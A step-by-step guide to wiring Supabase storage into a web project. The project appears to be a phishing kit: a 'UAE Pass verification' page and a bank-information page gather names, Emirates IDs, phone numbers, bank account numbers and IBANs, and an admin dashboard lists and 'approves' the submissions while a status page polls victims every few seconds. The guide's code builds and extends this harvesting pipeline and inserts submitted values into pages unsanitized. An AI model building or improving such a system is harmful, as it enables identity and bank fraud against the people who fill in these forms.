# 🚀 Supabase Integration Guide
**Your Database is Ready!** ✅

---

## ✅ **STEP 1: Get Your Supabase Credentials**

### **How to Find Them:**

1. **Go to Supabase Dashboard:**
   - Open: https://supabase.com/dashboard
   - You should see your project: **liamt1468-gif's Project**

2. **Click on Your Project**

3. **Go to Settings:**
   - Click the **⚙️ Settings** icon in the left sidebar

4. **Click "API" Section:**
   - Under "Project Settings", click **API**

5. **Copy These Two Values:**
   
   **A. Project URL:**
   ```
   Example: https://abcdefghijklmnop.supabase.co
   ```
   
   **B. Project API Key (anon, public):**
   ```
   Example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFiY2RlZmdoaWprbG1ub3AiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTYzMDQ0NjQ4MCwiZXhwIjoxOTQ2MDIyNDgwfQ.abc123def456...
   ```

---

## ✅ **STEP 2: Update Configuration File**

1. **Open File:**
   ```
   site/wp-content/supabase-config.js
   ```

2. **Replace the Placeholder Values:**
   
   **BEFORE:**
   ```javascript
   const SUPABASE_CONFIG = {
       url: 'YOUR_SUPABASE_URL',
       anonKey: 'YOUR_SUPABASE_ANON_KEY'
   };
   ```
   
   **AFTER:** (with your actual values)
   ```javascript
   const SUPABASE_CONFIG = {
       url: 'https://your-actual-project-id.supabase.co',
       anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSI...'
   };
   ```

3. **Save the file** ✅

---

## ✅ **STEP 3: Update Your HTML Pages**

You need to add the Supabase library and new scripts to your pages.

### **For UAE Pass Verification Page:**

**File:** `site/uae-pass-verification/index.html`

**Find this line (~line 258):**
```html
<script src="../wp-content/data-management.js"></script>
```

**Replace with:**
```html
<!-- Supabase Client Library -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<!-- Supabase Configuration -->
<script src="../wp-content/supabase-config.js"></script>

<!-- Supabase Data Management -->
<script src="../wp-content/data-management-supabase.js"></script>
```

---

### **For Bank Information Page:**

**File:** `site/bank-information/index.html`

**Find this line (~line 260):**
```html
<script src="../wp-content/data-management.js"></script>
```

**Replace with:**
```html
<!-- Supabase Client Library -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<!-- Supabase Configuration -->
<script src="../wp-content/supabase-config.js"></script>

<!-- Supabase Data Management -->
<script src="../wp-content/data-management-supabase.js"></script>

<script>
// Bank page specific code
document.addEventListener('DOMContentLoaded', async function() {
    const uaeData = await getUAEPassData();
    
    if (uaeData) {
        // Display session info in sidebar
        const sidebar = document.querySelector('.side-menu-links');
        if (sidebar) {
            const sessionInfo = document.createElement('div');
            sessionInfo.className = 'session-info';
            sessionInfo.innerHTML = `
                <p><strong>Active Session</strong></p>
                <p>User: ${uaeData.uae_pass_data.fullName}</p>
                <p>Status: ${uaeData.status}</p>
            `;
            sidebar.insertBefore(sessionInfo, sidebar.firstChild);
        }
    }
    
    // Handle form submission
    document.addEventListener('wpcf7mailsent', async function(event) {
        const formData = event.detail.inputs;
        const formDetails = {};
        formData.forEach(input => {
            formDetails[input.name] = input.value;
        });

        const bankData = {
            bankName: formDetails['bank-name'] || '',
            accountNumber: formDetails['account-number'] || '',
            iban: formDetails['iban'] || ''
        };
        
        const success = await updateWithBankInfo(bankData);
        
        if (success) {
            alert('Bank information submitted successfully!\n\nYour application is now pending approval.');
        } else {
            alert('There was an issue submitting your bank information. Please try again.');
        }
    }, false);
});
</script>
```

---

### **For Admin Dashboard:**

**File:** `admin/index.html`

**Find this line (~line 521):**
```html
<script src="site/wp-content/data-management.js"></script>
```

**Replace with:**
```html
<!-- Supabase Client Library -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<!-- Supabase Configuration -->
<script src="site/wp-content/supabase-config.js"></script>

<!-- Supabase Data Management -->
<script src="site/wp-content/data-management-supabase.js"></script>
```

**Then update the `loadApplications()` function (around line 740):**

**BEFORE:**
```javascript
function loadApplications() {
    const stored = localStorage.getItem('allSubmissions');
    const rawApplications = stored ? JSON.parse(stored) : [];
    // ...
}
```

**AFTER:**
```javascript
async function loadApplications() {
    const rawApplications = await getAllSubmissions();
    
    applications = rawApplications.map(app => ({
        id: app.session_id,
        fullName: app.uae_pass_data?.fullName || 'N/A',
        emiratesId: app.uae_pass_data?.emiratesId || 'N/A',
        email: app.uae_pass_data?.email || 'N/A',
        mobileNumber: app.uae_pass_data?.phone || 'N/A',
        nationality: app.uae_pass_data?.nationality || 'N/A',
        bankName: app.bank_info?.bankName || 'N/A',
        accountNumber: app.bank_info?.accountNumber || 'N/A',
        iban: app.bank_info?.iban || 'N/A',
        status: app.status === 'pending_bank_info' ? 'pending' : 
               app.status === 'pending_approval' ? 'pending' : app.status,
        timestamp: app.timestamp,
        submittedAt: app.submitted_at
    }));
    
    filterApplications();
}
```

**Update the `updateStatus()` function (around line 957):**

**BEFORE:**
```javascript
function updateStatus(id, status) {
    const dataStr = localStorage.getItem('verification_' + id);
    // ...
}
```

**AFTER:**
```javascript
async function updateStatus(id, status) {
    const success = await updateVerificationStatus(id, status);
    
    if (success) {
        closeModal();
        await loadApplications();
        
        const message = currentLanguage === 'ar'
            ? (status === 'approved' ? 'تمت الموافقة على الطلب بنجاح!' : 'تم رفض الطلب بنجاح!')
            : `Application ${status === 'approved' ? 'approved' : 'rejected'} successfully!`;
        
        alert(message);
    } else {
        alert('Error updating status. Please try again.');
    }
}
```

---

### **For Status Checker:**

**File:** `status/index.html`

**Find this line (~line 510):**
```html
<script src="site/wp-content/data-management.js"></script>
```

**Replace with:**
```html
<!-- Supabase Client Library -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<!-- Supabase Configuration -->
<script src="site/wp-content/supabase-config.js"></script>

<!-- Supabase Data Management -->
<script src="site/wp-content/data-management-supabase.js"></script>
```

**Update the `loadStatus()` function (around line 649):**

**BEFORE:**
```javascript
function loadStatus() {
    let sessionId = sessionStorage.getItem('verificationSessionId');
    // ...
    const dataStr = localStorage.getItem('verification_' + sessionId);
    // ...
}
```

**AFTER:**
```javascript
async function loadStatus() {
    let sessionId = sessionStorage.getItem('verificationSessionId');
    
    if (!sessionId) {
        const urlParams = new URLSearchParams(window.location.search);
        sessionId = urlParams.get('session');
    }
    
    if (!sessionId) {
        document.getElementById('statusContent').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <h3>Enter Your Session ID</h3>
                <input type="text" id="manualSessionId" placeholder="session_1234567890_abc" 
                       style="padding: 10px; width: 300px; margin: 20px 0;">
                <br>
                <button onclick="checkManualSession()" 
                        style="padding: 10px 30px; background: #00a99d; color: white; border: none; border-radius: 5px; cursor: pointer;">
                    Check Status
                </button>
            </div>
        `;
        return;
    }
    
    const verification = await getVerificationBySessionId(sessionId);
    
    if (verification) {
        currentApplication = verification;
        displayStatus();
        
        if (checkInterval) clearInterval(checkInterval);
        checkInterval = setInterval(loadStatus, 5000);
    } else {
        document.getElementById('statusContent').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <p style="color: #f44336; font-size: 18px;">❌ Verification not found</p>
                <p>Session ID: ${sessionId}</p>
            </div>
        `;
    }
}

async function checkManualSession() {
    const sessionId = document.getElementById('manualSessionId').value.trim();
    if (sessionId) {
        sessionStorage.setItem('verificationSessionId', sessionId);
        await loadStatus();
    }
}
```

---

## ✅ **STEP 4: Test the Integration**

### **1. Open Browser Console:**
   - Press `F12` in your browser
   - Go to "Console" tab

### **2. Check for Supabase Connection:**
   - Refresh your page
   - You should see: `✅ Supabase initialized successfully`

### **3. Test the Flow:**
   1. Fill out UAE Pass form
   2. Submit
   3. Check console for: `✅ UAE Pass data stored in Supabase`
   4. Go to bank information page
   5. Submit bank form
   6. Check console for: `✅ Bank info updated in Supabase`

### **4. Verify in Supabase Dashboard:**
   1. Go to: https://supabase.com/dashboard
   2. Click your project
   3. Click "Table Editor" in left sidebar
   4. Click "verifications" table
   5. You should see your submitted data! ✅

---

## 🔧 **TROUBLESHOOTING**

### **Error: "Supabase library not loaded"**
**Solution:** Make sure the CDN script is loaded:
```html
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
```

### **Error: "Please update SUPABASE_CONFIG"**
**Solution:** Update `supabase-config.js` with your actual credentials

### **Error: "No rows found" or "PGRST116"**
**Solution:** This is normal - it means no verification exists for that session ID yet

### **Data Not Appearing in Supabase**
**Solution:** 
1. Check browser console for errors
2. Verify your API key is correct
3. Check Supabase dashboard for any service issues
4. The system will fallback to localStorage if Supabase fails

---

## 📊 **MIGRATION FROM LOCALSTORAGE**

### **Option A: Fresh Start (Recommended)**
- Just start using the new system
- Old localStorage data will remain as backup
- New submissions go to Supabase

### **Option B: Migrate Existing Data**
Run this in browser console:
```javascript
async function migrateToSupabase() {
    const allSubmissions = JSON.parse(localStorage.getItem('allSubmissions') || '[]');
    const supabase = window.getSupabaseClient();
    
    for (const submission of allSubmissions) {
        const { error } = await supabase.from('verifications').insert([{
            session_id: submission.sessionId,
            uae_pass_data: submission.uaePassData,
            bank_info: submission.bankInfo,
            status: submission.status,
            timestamp: submission.timestamp,
            submitted_at: submission.submittedAt,
            approved_at: submission.approvedAt,
            rejected_at: submission.rejectedAt
        }]);
        
        if (error) console.error('Migration error:', error);
        else console.log('✅ Migrated:', submission.sessionId);
    }
    
    console.log('Migration complete!');
}

// Run migration
migrateToSupabase();
```

---

## 🎯 **BENEFITS OF SUPABASE**

| Feature | localStorage | Supabase |
|---------|-------------|----------|
| **Data Persistence** | Per-browser only | Permanent database |
| **Multi-device Access** | ❌ No | ✅ Yes |
| **Admin Dashboard** | Limited | Full SQL queries |
| **Data Export** | Manual | CSV/JSON export |
| **Real-time Updates** | ❌ No | ✅ Yes (optional) |
| **Data Backup** | ❌ No | ✅ Automatic |
| **Storage Limit** | ~10MB | 500MB (free tier) |
| **Production Ready** | ❌ No | ✅ Yes |

---

## 🚀 **NEXT STEPS**

1. ✅ Update `supabase-config.js` with your credentials
2. ✅ Update all 4 HTML pages with new script tags
3. ✅ Test the system end-to-end
4. ✅ Check Supabase dashboard to see data
5. ✅ Deploy to production!

---

**Need Help?** 
- Check browser console for errors
- Verify Supabase credentials are correct
- Test with a simple form submission first

**Your database table is ready!** ✅  
**Just add your credentials and update the HTML pages!** 🎉
